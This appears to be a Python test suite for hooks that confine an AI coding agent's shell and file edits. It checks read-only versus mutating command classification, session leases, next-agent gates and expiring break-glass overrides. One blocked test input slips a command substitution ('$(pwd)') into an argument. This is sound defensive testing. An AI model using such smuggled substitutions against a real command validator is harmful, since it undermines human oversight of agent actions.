                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                    blocked = self.dispatch_with_payload(repo, payload)
                    self.assertEqual(blocked["decision"], "block")
                    self.assertIn("bootstrap/delegation deadlock", blocked["reason"])

    def test_workspace_less_repo_worker_assignment_claim_and_hook_edit(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            fake_home = tmp_path / "home"
            repo = tmp_path / "repo"
            self.init_repo(repo, "workspace-less\n")
            (repo / ".codex").mkdir()
            (repo / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            env = {"HOME": str(fake_home)}
            payload = {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(repo / "README.md")}}
            blocked = self.dispatch_with_payload(repo, payload, env)
            self.assertEqual(blocked["decision"], "block")
            self.assertIn("delegate to a subagent", blocked["reason"])

            with patch.dict(os.environ, env):
                assignment = assignment_create(repo, "dlc_repo_worker", "source", ["README.md"], "WI-001")
                validate_required(assignment)
                self.assertTrue(assignment["workspace_less"])
                lease = agent_claim(repo, assignment["id"], session_id="sess-source")
                validate_required(lease)
                self.assertTrue(lease["workspace_less"])

            allowed = self.dispatch_with_payload(repo, payload, {**env, "CODEX_SESSION_ID": "sess-source"})
            self.assertEqual(allowed, {})

            payload_session = {
                "session_id": "sess-source",
                "hook_event_name": "PreToolUse",
                "tool_name": "Edit",
                "tool_input": {"file_path": str(repo / "README.md")},
            }
            allowed_from_payload_session = self.dispatch_with_payload(repo, payload_session, env)
            self.assertEqual(allowed_from_payload_session, {})

            forbidden_path = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(repo / ".git" / "config")}},
                {**env, "CODEX_SESSION_ID": "sess-source"},
            )
            self.assertEqual(forbidden_path["decision"], "block")
            self.assertIn("workspace-less lease violation", forbidden_path["reason"])

            outside_writable = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(repo / "notes.md")}},
                {**env, "CODEX_SESSION_ID": "sess-source"},
            )
            self.assertEqual(outside_writable["decision"], "block")
            self.assertIn("workspace-less lease violation", outside_writable["reason"])

    def test_workspace_less_initializer_and_repairer_assignments_are_lease_scoped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            fake_home = tmp_path / "home"
            repo = tmp_path / "repo"
            self.init_repo(repo, "workspace-less bootstrap\n")
            (repo / ".codex").mkdir()
            (repo / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            env = {"HOME": str(fake_home)}
            local_target = tmp_path / ".local" / "ai-dlc" / "bootstrap.json"
            payload = {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(local_target)}}
            blocked = self.dispatch_with_payload(repo, payload, env)
            self.assertEqual(blocked["decision"], "block")
            self.assertIn("delegate to a subagent", blocked["reason"])

            with patch.dict(os.environ, env):
                initializer = assignment_create(repo, "dlc_initializer", None, ["../.local/**"], None)
                self.assertEqual(initializer["phase"], "initializing")
                self.assertEqual(initializer["phase_owner"], "dlc_initializer")
                self.assertEqual(initializer["lock_scope"], "bootstrap.lock")
                init_lease = agent_claim(repo, initializer["id"], session_id="sess-init")
                self.assertEqual(init_lease["plan_status"], "initializing")

                repairer = assignment_create(repo, "dlc_repairer", None, ["ai-dlc/decisions/**"], None)
                self.assertEqual(repairer["phase"], "repairing")
                self.assertEqual(repairer["phase_owner"], "dlc_repairer")

                with self.assertRaisesRegex(ValueError, "bootstrap/recovery"):
                    assignment_create(repo, "dlc_initializer", None, ["packages/app.py"], None)
                with self.assertRaisesRegex(ValueError, "must not set --repo"):
                    assignment_create(repo, "dlc_repairer", "source", ["ai-dlc/decisions/**"], None)

            allowed = self.dispatch_with_payload(repo, payload, {**env, "CODEX_SESSION_ID": "sess-init"})
            self.assertEqual(allowed, {})

            outside_writable = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(repo / "packages" / "app.py")}},
                {**env, "CODEX_SESSION_ID": "sess-init"},
            )
            self.assertEqual(outside_writable["decision"], "block")
            self.assertIn("workspace-less lease violation", outside_writable["reason"])

    def test_workspace_less_assignment_cli_create_and_claim(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            fake_home = tmp_path / "home"
            repo = tmp_path / "repo"
            self.init_repo(repo, "workspace-less cli\n")

            with patch.dict(os.environ, {"HOME": str(fake_home)}), patch("aidlc.cli.Path.cwd", return_value=repo):
                stdout = io.StringIO()
                with contextlib.redirect_stdout(stdout):
                    self.assertEqual(
                        cli.main([
                            "assignment",
                            "create",
                            "--role",
                            "dlc_repo_worker",
                            "--repo",
                            "source",
                            "--work-item",
                            "WI-001",
                            "--writable",
                            "README.md",
                        ]),
                        0,
                    )
                assignment = json.loads(stdout.getvalue())
                self.assertEqual(assignment["role"], "dlc_repo_worker")
                self.assertTrue(assignment["workspace_less"])

                stdout = io.StringIO()
                with contextlib.redirect_stdout(stdout):
                    self.assertEqual(cli.main(["agent-claim", "--assignment", assignment["id"], "--session-id", "sess-cli"]), 0)
                lease = json.loads(stdout.getvalue())
                self.assertEqual(lease["assignment_id"], assignment["id"])
                self.assertTrue(lease["workspace_less"])

    def test_workspace_less_assignment_prompt_context_guides_repo_worker(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            fake_home = tmp_path / "home"
            repo = tmp_path / "repo"
            self.init_repo(repo, "workspace-less prompt\n")
            (repo / ".codex").mkdir()
            (repo / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            env = {"HOME": str(fake_home)}
            with patch.dict(os.environ, env):
                assignment = assignment_create(repo, "dlc_repo_worker", "source", ["README.md"], "WI-001")

            session = self.dispatch_with_payload(repo, {"hook_event_name": "SessionStart"}, env)
            session_context = session["hookSpecificOutput"]["additionalContext"]
            self.assertIn("Controller-only bootstrap phase", session_context)
            self.assertIn("workspace-less assignments", session_context)
            self.assertIn("lease-scoped paths", session_context)

            prompt = self.dispatch_with_payload(
                repo,
                {
                    "session_id": "sess-worker",
                    "hook_event_name": "UserPromptSubmit",
                    "prompt": f"Use assignment {assignment['id']} to edit README.md",
                },
                env,
            )
            prompt_context = prompt["hookSpecificOutput"]["additionalContext"]
            self.assertIn(f"Workspace-less dlc_repo_worker assignment: {assignment['id']}", prompt_context)
            self.assertIn(f"ai-dlc agent-claim --assignment {assignment['id']} --session-id sess-worker", prompt_context)
            self.assertIn("README.md", prompt_context)
            self.assertIn("controller-only direct edit ban applies before claim", prompt_context)

    def test_dotfiles_root_config_no_longer_grants_controller_source_or_test_bootstrap_paths(self) -> None:
        repo_root = Path(__file__).resolve().parents[1]
        config_path = repo_root / ".codex" / "config.toml"
        guardrails = hooks._read_guardrails(config_path)
        patterns = guardrails["bootstrap_edit_paths"]

        self.assertFalse(any(fnmatch.fnmatch("packages/codex/.codex/ai-dlc/lib/aidlc/hooks.py", pattern) for pattern in patterns))
        self.assertFalse(any(fnmatch.fnmatch("tests/test_aidlc.py", pattern) for pattern in patterns))
        self.assertNotIn("[profiles.", config_path.read_text(encoding="utf-8"))

    def test_hook_dispatch_allows_read_only_sed_and_related_bash_outside_workspace(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            commands = [
                "sed -n '1,5p' README.md",
                "head -n 5 README.md",
                "tail -n 5 README.md",
                "wc -l README.md",
                "sort README.md",
                "uniq README.md",
                "cut -d: -f1 README.md",
            ]
            for command in commands:
                with self.subTest(command=command):
                    allowed = self.dispatch_with_payload(
                        repo,
                        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                    )
                    self.assertEqual(allowed, {})

    def test_hook_dispatch_allows_read_only_pipelines_outside_workspace(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            read_only_commands = [
                "rg pattern README.md | head -n 20",
                "nl -ba README.md | sed -n '1,20p'",
                "git show --stat HEAD | sed -n '1,40p'",
            ]
            for command in read_only_commands:
                with self.subTest(command=command):
                    allowed = self.dispatch_with_payload(
                        repo,
                        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                    )
                    self.assertEqual(allowed, {}, f"Expected allow for: {command}")

            blocked_commands = [
                "rg pattern README.md | tee out.txt",
                "rg pattern README.md > out.txt",
                "rg pattern README.md && head -n 20 README.md",
                "rg $(pwd) README.md | head -n 20",
                "nl -ba README.md | sed -i 's/a/b/'",
            ]
            for command in blocked_commands:
                with self.subTest(command=command):
                    blocked = self.dispatch_with_payload(
                        repo,
                        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                    )
                    self.assertEqual(blocked["decision"], "block")
                    self.assertIn("mutating Bash", blocked["reason"])

    def test_hook_dispatch_allows_project_validation_python_commands_outside_workspace(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            allowed_commands = [
                "python3 -m py_compile packages/codex/.codex/ai-dlc/lib/aidlc/hooks.py packages/codex/.codex/ai-dlc/lib/aidlc/block_ledger.py",
                "python -m py_compile tests/test_aidlc.py",
                "python3 -m unittest tests.test_aidlc",
                "python3 -m unittest -k test_hook_dispatch_allows_project_validation_python_commands_outside_workspace tests.test_aidlc",
                "python -m unittest -k AidlcTest.test_hook_dispatch_allows_project_validation_python_commands_outside_workspace tests.test_aidlc",
            ]
            for command in allowed_commands:
                with self.subTest(command=command):
                    allowed = self.dispatch_with_payload(
                        repo,
                        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                    )
                    self.assertEqual(allowed, {}, f"Expected allow for: {command}")

            blocked_commands = [
                "python3 -c 'print(1)'",
                "python -c 'print(1)'",
                "python3 scripts/check.py",
                "python3 -m unittest tests.other",
                "python3 -m unittest -k test_hook_dispatch_allows_project_validation_python_commands_outside_workspace tests.other",
                "python3 -m py_compile packages/codex/.codex/ai-dlc/lib/aidlc/hooks.py>out",
                "python3 -m py_compile packages/codex/.codex/ai-dlc/lib/aidlc/nested/module.py",
            ]
            for command in blocked_commands:
                with self.subTest(command=command):
                    blocked = self.dispatch_with_payload(
                        repo,
                        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                    )
                    self.assertEqual(blocked["decision"], "block", f"Expected block for: {command}")
                    self.assertIn("mutating Bash", blocked["reason"])

    def test_hook_dispatch_classifies_git_remote_and_worktree_read_only_precisely(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            read_only_commands = [
                "git remote -v",
                "git remote get-url origin",
                "git worktree list",
                "git -C . worktree list",
            ]
            for command in read_only_commands:
                with self.subTest(command=command):
                    allowed = self.dispatch_with_payload(
                        repo,
                        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                    )
                    self.assertEqual(allowed, {})

            mutating_commands = [
                "git worktree add ../other",
                "git -C . worktree add ../other",
                "git remote add origin git@example.com:owner/repo.git",
                "git remote set-url origin git@example.com:owner/repo.git",
            ]
            for command in mutating_commands:
                with self.subTest(command=command):
                    blocked = self.dispatch_with_payload(
                        repo,
                        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                    )
                    self.assertEqual(blocked["decision"], "block")
                    self.assertIn("mutating Bash", blocked["reason"])

            diagnosis = hooks.diagnose_block(
                repo,
                "PreToolUse",
                "Bash",
                "git worktree add ../other",
                "Controller-only: mutating Bash is blocked outside AI-DLC; delegate to a subagent.",
            )
            self.assertEqual(diagnosis["block_type"], "needs_assignment")
            self.assertEqual(diagnosis["suggested_route"], "delegate_phase_owner")

    def test_hook_dispatch_allows_read_only_gh_commands_outside_workspace(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            read_only_commands = [
                "gh pr view 123 --repo owner/repo --json title",
                "gh pr list --repo owner/repo",
                "gh pr diff 123",
                "gh pr checks 123",
                "gh pr status",
                "gh issue view 456",
                "gh issue list --repo owner/repo",
                "gh issue status",
                "gh run view 789",
                "gh run list",
                "gh release view v1.0",
                "gh release list",
                "gh repo view owner/repo",
                "gh api repos/owner/repo/pulls/123/comments",
            ]
            for command in read_only_commands:
                with self.subTest(command=command):
                    allowed = self.dispatch_with_payload(
                        repo,
                        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                    )
                    self.assertEqual(allowed, {}, f"Expected allow for: {command}")

            mutating_commands = [
                "gh pr merge 123",
                "gh pr create --title test --body test",
                "gh pr comment 123 --body test",
                "gh pr review 123 --approve",
                "gh pr close 123",
                "gh pr checkout 123",
                "gh issue create --title test",
                "gh issue close 456",
                "gh repo create test-repo",
                "gh release create v2.0",
            ]
            for command in mutating_commands:
                with self.subTest(command=command):
                    blocked = self.dispatch_with_payload(
                        repo,
                        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                    )
                    self.assertEqual(blocked["decision"], "block", f"Expected block for: {command}")
                    self.assertIn("mutating Bash", blocked["reason"])

    def test_hook_dispatch_returns_block_json_for_mutating_non_workspace_bash(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            blocked = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "sed -i 's/x/y/' README.md"}},
            )
            self.assertEqual(blocked["decision"], "block")
            self.assertIn("mutating Bash", blocked["reason"])

    def test_hook_dispatch_cli_exits_successfully_on_block(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            code, output = self.run_hook_dispatch(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "mkdir -p scratch"}},
            )
            self.assertEqual(code, 0)
            self.assertEqual(output["decision"], "block")
            self.assertIn("mutating Bash", output["reason"])

    def test_init_workspace_reports_prerequisites_with_next_actions(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "root-system"
            web = Path(tmp) / "web"
            self.init_repo(root, "root\n")
            self.init_repo(web, "web\n")
            stderr = io.StringIO()
            with patch("aidlc.cli.Path.cwd", return_value=root), contextlib.redirect_stderr(stderr):
                code = cli.main([
                    "init-workspace",
                    "--issue",
                    "LIN-123",
                    "--issue-url",
                    "https://linear.app/acme/issue/LIN-123",
                    "--issue-title",
                    "Bootstrap missing remotes",
                    "--branch",
                    "LIN-123-branch",
                    "--repo",
                    f"web={web}",
                ])
            output = stderr.getvalue()
            self.assertEqual(code, 2)
            self.assertIn("init-workspace prerequisites are not met", output)
            self.assertIn("root-system canonical repo URL is unavailable", output)
            self.assertIn("canonical repo URL is unavailable for web", output)
            self.assertIn("Next actions:", output)
            self.assertIn("--root-canonical-url", output)
            self.assertIn("--repo-url web=...", output)

    def test_workspace_commands_report_missing_workspace_without_traceback(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            for command in ("status", "inspect"):
                stderr = io.StringIO()
                with self.subTest(command=command), patch("aidlc.cli.Path.cwd", return_value=repo), contextlib.redirect_stderr(stderr):
                    code = cli.main([command])
                output = stderr.getvalue()
                self.assertEqual(code, 2)
                self.assertIn("workspace.yaml not found", output)
                self.assertNotIn("Traceback", output)

    def test_context_prefers_project_local_ai_dlc_state(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            workspace_context = ai_dlc_context(root / "web")
            self.assertEqual(workspace_context["mode"], "task_workspace")
            self.assertEqual(workspace_context["control_plane_scope"], "project")
            self.assertEqual(workspace_context["root"], str(root))

            project = Path(tmp) / "plain-project"
            (project / "ai-dlc").mkdir(parents=True)
            (project / "ai-dlc" / "project-metadata.yaml").write_text("id: plain\n", encoding="utf-8")
            project_context = ai_dlc_context(project)
            self.assertEqual(project_context["mode"], "project_root")
            self.assertEqual(project_context["control_plane_scope"], "project")
            self.assertEqual(project_context["root"], str(project.resolve()))

    def test_context_lists_discoverable_worktrees_from_root_system(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root_system, task_root, _ = self.create_root_system_task_workspace(Path(tmp))
            context = ai_dlc_context(root_system)
            self.assertEqual(context["mode"], "project_root")
            self.assertEqual(context["root"], str(root_system.resolve()))
            self.assertEqual(context["discoverable_workspaces"][0]["id"], "LIN-123")
            self.assertEqual(context["discoverable_workspaces"][0]["root"], str(task_root.resolve()))

    def test_context_cli_and_status_support_explicit_workspace_target(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root_system, task_root, _ = self.create_root_system_task_workspace(Path(tmp))
            stdout = io.StringIO()
            with patch("aidlc.cli.Path.cwd", return_value=root_system), contextlib.redirect_stdout(stdout):
                self.assertEqual(cli.main(["context"]), 0)
            context = json.loads(stdout.getvalue())
            self.assertEqual(context["mode"], "project_root")
            self.assertEqual(context["discoverable_workspaces"][0]["id"], "LIN-123")

            stdout = io.StringIO()
            with patch("aidlc.cli.Path.cwd", return_value=root_system), contextlib.redirect_stdout(stdout):
                self.assertEqual(cli.main(["context", "--workspace", "LIN-123"]), 0)
            targeted = json.loads(stdout.getvalue())
            self.assertEqual(targeted["mode"], "task_workspace")
            self.assertEqual(targeted["root"], str(task_root.resolve()))

            stdout = io.StringIO()
            with patch("aidlc.cli.Path.cwd", return_value=root_system), contextlib.redirect_stdout(stdout):
                self.assertEqual(cli.main(["status", "--workspace", "LIN-123"]), 0)
            status = json.loads(stdout.getvalue())
            self.assertEqual(status["workspace_id"], "LIN-123")

    def test_assignment_create_supports_root_system_workspace_target(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root_system, _, _ = self.create_root_system_task_workspace(Path(tmp))
            stdout = io.StringIO()
            with patch("aidlc.cli.Path.cwd", return_value=root_system), contextlib.redirect_stdout(stdout):
                self.assertEqual(cli.main(["assignment", "create", "--workspace", "LIN-123", "--role", "dlc_plan_writer"]), 0)
            assignment = json.loads(stdout.getvalue())
            self.assertEqual(assignment["workspace_id"], "LIN-123")
            self.assertEqual(assignment["role"], "dlc_plan_writer")

    def test_context_warns_when_project_local_generic_hooks_exist(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            fake_home = Path(tmp) / "home"
            project = Path(tmp) / "plain-project"
            (project / "ai-dlc").mkdir(parents=True)
            (project / "ai-dlc" / "project-metadata.yaml").write_text("id: plain\n", encoding="utf-8")
            (project / ".codex" / "hooks").mkdir(parents=True)
            (project / ".codex" / "hooks.json").write_text("{}\n", encoding="utf-8")
            (project / ".codex" / "hooks" / "pre_tool_use.py").write_text("# stale\n", encoding="utf-8")

            with patch.dict(os.environ, {"HOME": str(fake_home)}):
                project_context = ai_dlc_context(project)

            self.assertEqual(project_context["mode"], "project_root")
            self.assertEqual(project_context["control_plane_scope"], "project")
            self.assertEqual(project_context["root"], str(project.resolve()))
            self.assertIn("project-local AI-DLC control-plane", project_context["recommendation"])

    def test_context_uses_codex_user_local_fallback_when_project_is_unconfigured(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            fake_home = Path(tmp) / "home"
            repo = Path(tmp) / "unconfigured"
            repo.mkdir()
            with patch.dict(os.environ, {"HOME": str(fake_home)}):
                before = ai_dlc_context(repo)
                self.assertEqual(before["mode"], "none")
                self.assertEqual(before["control_plane_scope"], "none")
                self.assertIn(str(fake_home / ".codex" / "ai-dlc" / "user-workspaces"), before["user_local_root"])
                self.assertIn("Project-local AI-DLC is recommended", before["recommendation"])
                self.assertIn("`hooks = true`", before["recommendation"])

                ensured = ai_dlc_context(repo, ensure_user_local=True)
                self.assertEqual(ensured["mode"], "user_local_available")
                self.assertEqual(ensured["control_plane_scope"], "user_local")
                user_root = Path(ensured["root"])
                self.assertTrue((user_root / "context.yaml").exists())
                self.assertTrue((user_root / "plans").is_dir())
                self.assertTrue((user_root / "decisions").is_dir())

                after = ai_dlc_context(repo)
                self.assertEqual(after["mode"], "user_local_available")
                self.assertEqual(after["root"], str(user_root))
                self.assertIn("`hooks = true`", after["recommendation"])

    def test_context_cli_reports_and_ensures_codex_user_local_fallback(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            fake_home = Path(tmp) / "home"
            repo = Path(tmp) / "unconfigured"
            repo.mkdir()
            with patch.dict(os.environ, {"HOME": str(fake_home)}), patch("aidlc.cli.Path.cwd", return_value=repo):
                stdout = io.StringIO()
                with contextlib.redirect_stdout(stdout):
                    self.assertEqual(cli.main(["context"]), 0)
                before = json.loads(stdout.getvalue())
                self.assertEqual(before["mode"], "none")

                stdout = io.StringIO()
                with contextlib.redirect_stdout(stdout):
                    self.assertEqual(cli.main(["ensure-context"]), 0)
                ensured = json.loads(stdout.getvalue())
                self.assertEqual(ensured["mode"], "user_local_available")
                self.assertTrue(Path(ensured["root"]).is_dir())

    def test_close_context_removes_only_user_local_fallback_state(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            fake_home = Path(tmp) / "home"
            repo = Path(tmp) / "unconfigured"
            repo.mkdir()
            with patch.dict(os.environ, {"HOME": str(fake_home)}):
                ensured = ai_dlc_context(repo, ensure_user_local=True)
                user_root = Path(ensured["root"])
                (user_root / "assignments" / "A001.yaml").write_text("id: A001\n", encoding="utf-8")

                cleaned = cleanup_user_context(repo)

                self.assertEqual(cleaned["status"], "deleted")
                self.assertFalse(user_root.exists())
                after = ai_dlc_context(repo)
                self.assertEqual(after["mode"], "none")

    def test_close_context_skips_project_local_context(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            project = Path(tmp) / "plain-project"
            (project / "ai-dlc").mkdir(parents=True)
            metadata = project / "ai-dlc" / "project-metadata.yaml"
            metadata.write_text("id: plain\n", encoding="utf-8")

            result = cleanup_user_context(project)

            self.assertEqual(result["status"], "skipped")
            self.assertTrue(metadata.exists())

    def test_close_context_cli_removes_codex_user_local_fallback(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            fake_home = Path(tmp) / "home"
            repo = Path(tmp) / "unconfigured"
            repo.mkdir()
            with patch.dict(os.environ, {"HOME": str(fake_home)}), patch("aidlc.cli.Path.cwd", return_value=repo):
                ai_dlc_context(repo, ensure_user_local=True)
                stdout = io.StringIO()
                with contextlib.redirect_stdout(stdout):
                    self.assertEqual(cli.main(["close-context"]), 0)

                result = json.loads(stdout.getvalue())
                self.assertEqual(result["status"], "deleted")
                self.assertFalse(Path(result["root"]).exists())

    def test_hook_dispatch_non_workspace_context_mentions_controller_only_when_enabled(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            result = self.dispatch_with_payload(repo, {"hook_event_name": "SessionStart"})
            output = result["hookSpecificOutput"]
            self.assertEqual(output["hookEventName"], "SessionStart")
            self.assertIn("Controller-only bootstrap phase", output["additionalContext"])
            self.assertIn("bootstrap_edit_paths", output["additionalContext"])

    def test_control_plane_role_can_edit_assigned_ai_dlc_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            assignment = assignment_create(root, "dlc_plan_writer", None, [], None)
            lease = agent_claim(root, assignment["id"], session_id="sess-plan")
            payload = {"tool_name": "Edit", "tool_input": {"file_path": str(root / "ai-dlc" / "plans" / "LIN-123.md")}}
            allowed = self.dispatch_with_payload(root, payload, {"CODEX_SESSION_ID": lease["session_id"]})
            self.assertEqual(allowed["decision"], "allow")

            forbidden_payload = {"tool_name": "Edit", "tool_input": {"file_path": str(root / "ai-dlc" / "evidence" / "LIN-123.yaml")}}
            blocked = self.dispatch_with_payload(root, forbidden_payload, {"CODEX_SESSION_ID": lease["session_id"]})
            self.assertEqual(blocked["decision"], "block")
            self.assertIn("lease violation", blocked["reason"])

    def test_hook_dispatch_enforces_next_agent_gate(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            blocked = self.dispatch_with_payload(root, {"tool_name": "spawn_agent", "tool_input": {"agent": "dlc_verifier"}})
            self.assertEqual(blocked["decision"], "block")
            self.assertIn("next agent must be", blocked["reason"])

            allowed = self.dispatch_with_payload(root, {"tool_name": "spawn_agent", "tool_input": {"agent": "dlc_plan_writer"}})
            self.assertEqual(allowed["decision"], "allow")

            decisions = root / "ai-dlc" / "decisions" / "LIN-123.md"
            decisions.write_text(decisions.read_text(encoding="utf-8") + "\n- allow-next-agent: dlc_verifier\n", encoding="utf-8")
            override = self.dispatch_with_payload(root, {"tool_name": "spawn_agent", "tool_input": {"agent": "dlc_verifier"}})
            self.assertEqual(override["decision"], "allow")

    def test_hook_allows_scoped_break_glass_controller_artifact_edit(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            payload = {"tool_name": "Edit", "tool_input": {"file_path": str(root / "ai-dlc" / "plans" / "LIN-123.md")}}
            blocked = self.dispatch_with_payload(root, payload)
            self.assertEqual(blocked["decision"], "block")

            decisions = root / "ai-dlc" / "decisions" / "LIN-123.md"
            decisions.write_text(
                decisions.read_text(encoding="utf-8")
                + "\nallow-break-glass: controller_artifact_edit\n"
                + "reason: repair invalid plan schema that blocks all subagents\n"
                + "scope: ai-dlc/plans/LIN-123.md\n"
                + "expires_at: 2099-01-01T00:00:00+00:00\n",
                encoding="utf-8",
            )
            allowed = self.dispatch_with_payload(root, payload)
            self.assertEqual(allowed["decision"], "allow")

    def test_scoped_break_glass_requires_matching_scope_and_future_expiry(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            payload = {"tool_name": "Edit", "tool_input": {"file_path": str(root / "ai-dlc" / "plans" / "LIN-123.md")}}
            decisions = root / "ai-dlc" / "decisions" / "LIN-123.md"
            base = decisions.read_text(encoding="utf-8")

            decisions.write_text(
                base
                + "\nallow-break-glass: controller_artifact_edit\n"
                + "reason: missing scope should not permit path edits\n"
                + "expires_at: 2099-01-01T00:00:00+00:00\n",
                encoding="utf-8",
            )
            missing_scope = self.dispatch_with_payload(root, payload)
            self.assertEqual(missing_scope["decision"], "block")

            decisions.write_text(
                base
                + "\nallow-break-glass: controller_artifact_edit\n"
                + "reason: wrong scope should not permit this path\n"
                + "scope: ai-dlc/handoff/LIN-123.md\n"
                + "expires_at: 2099-01-01T00:00:00+00:00\n",
                encoding="utf-8",
            )
            wrong_scope = self.dispatch_with_payload(root, payload)
            self.assertEqual(wrong_scope["decision"], "block")

            decisions.write_text(
                base
                + "\nallow-break-glass: controller_artifact_edit\n"
                + "reason: expired marker should not permit this path\n"
                + "scope: ai-dlc/plans/LIN-123.md\n"
                + "expires_at: 2000-01-01T00:00:00+00:00\n",
                encoding="utf-8",
            )
            expired = self.dispatch_with_payload(root, payload)
            self.assertEqual(expired["decision"], "block")

    def test_workspace_stop_blocks_until_phase_owner_deliverable_or_break_glass(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            blocked = self.dispatch_with_payload(root, {"hook_event_name": "Stop"})
            output = blocked["hookSpecificOutput"]
            self.assertEqual(output["hookEventName"], "Stop")
            self.assertEqual(output["decision"], "block")
            self.assertIn("dlc_plan_writer", output["reason"])

            decisions = root / "ai-dlc" / "decisions" / "LIN-123.md"
            decisions.write_text(
                decisions.read_text(encoding="utf-8")
                + "\nallow-break-glass: validator_bypass_once\n"
                + "reason: user explicitly requested stop despite missing phase deliverable\n"
                + "expires_at: 2099-01-01T00:00:00+00:00\n",
                encoding="utf-8",
            )
            allowed = self.dispatch_with_payload(root, {"hook_event_name": "Stop"})
            self.assertEqual(allowed, {})

    def test_hook_dispatch_blocks_verifier_while_worker_claimed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            self.prepare_active_web_item(root)
            bootstrap(root)
            decisions = root / "ai-dlc" / "decisions" / "LIN-123.md"
            decisions.write_text(decisions.read_text(encoding="utf-8") + "\n- allow-next-agent: dlc_verifier\n", encoding="utf-8")
            assignment = assignment_create(root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")
            agent_claim(root, assignment["id"], session_id="sess-web")
            blocked = self.dispatch_with_payload(root, {"tool_name": "spawn_agent", "tool_input": {"agent": "dlc_verifier"}})
            self.assertEqual(blocked["decision"], "block")
